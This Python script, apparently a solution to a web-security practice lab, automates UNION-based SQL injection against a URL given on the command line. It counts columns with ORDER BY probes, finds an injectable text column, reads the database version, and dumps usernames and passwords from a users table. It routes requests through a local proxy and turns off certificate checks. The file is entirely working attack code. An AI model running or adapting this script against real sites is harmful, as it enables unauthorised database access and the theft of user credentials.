#!/usr/bin/env python3
# sqli-union4
# SQLi UNION retrieving multiple values in a single column.
import requests
import sys
from bs4 import BeautifulSoup

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_col(url):
    for i in range(1,100):
        sqli = f"' ORDER BY {i}--"
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" in req.text:
            return i-1
        i = i+1
    return False

def injectable_col(url, col_number):
    for i in range(1,col_number+1):
        payload_list = ['NULL'] * col_number
        payload_list[i-1] = "'a'"
        sqli = f"' UNION SELECT {','.join(payload_list)}--"
        req = requests.get(url+sqli, verify=False, proxies=proxies)
        if "Internal Server Error" not in req.text:
            return sqli
    return False

def get_version(url, payload):
    payload = payload.replace("'a'", "version()")
    req = requests.get(url+payload, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        result = soup.find_all('th')
        return result[-1]
    else:
        return False

def dump_user(url, payload):
    sqli = "username || ':' || password FROM users--"
    payload = payload.replace("'a'",sqli)
    req = requests.get(url+payload, verify=False, proxies=proxies)
    if "Internal Server Error" not in req.text:
        soup = BeautifulSoup(req.text, 'html.parser')
        result = soup.find_all('th')
        return result
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} http://example.com")
        sys.exit(1)

    print("[-] Figuring out number of columns...")
    num_col = get_col(url)
    if num_col:
        print("[-] The number of columns is [{}]...".format(num_col))
        print("[-] Figuring out injectable columns...")
        inject_col = injectable_col(url, num_col)
        if inject_col:
            print("[-] Found the injectable columns... [{}]".format(inject_col))
            print("[-] Found the version... [{}]".format(get_version(url, inject_col)))
            dump = dump_user(url, inject_col)
            print("[-] Trying to dump user...")
            if dump:
                print("[-] Dumping user...")
                print(dump)
            else:
                print("[-] Can't dump any user!")
        else:
            print("[-] SQLi UNION not successful!")
    else:
        print("[-] SQLi UNION not successful!")